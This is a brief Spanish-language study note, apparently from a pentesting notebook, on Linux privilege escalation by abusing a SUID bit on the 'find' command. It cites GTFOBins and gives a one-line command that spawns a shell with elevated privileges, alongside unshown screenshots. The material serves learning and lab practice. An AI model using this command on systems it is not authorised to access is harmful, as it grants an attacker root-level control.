main recurso -> https://gtfobins.org/


------
### escalada via SUID en comando **FIND**
NOTA: se probo distintas shells del ejemplo y sirve independiente del permiso. solo aprovechar el SUID
https://gtfobins.org/gtfobins/find/#file-read

![[Pasted image 20260122004437.png]]

```
find / -exec /bin/rbash -p \; -quit
```

![[Pasted image 20260122004139.png]]

------


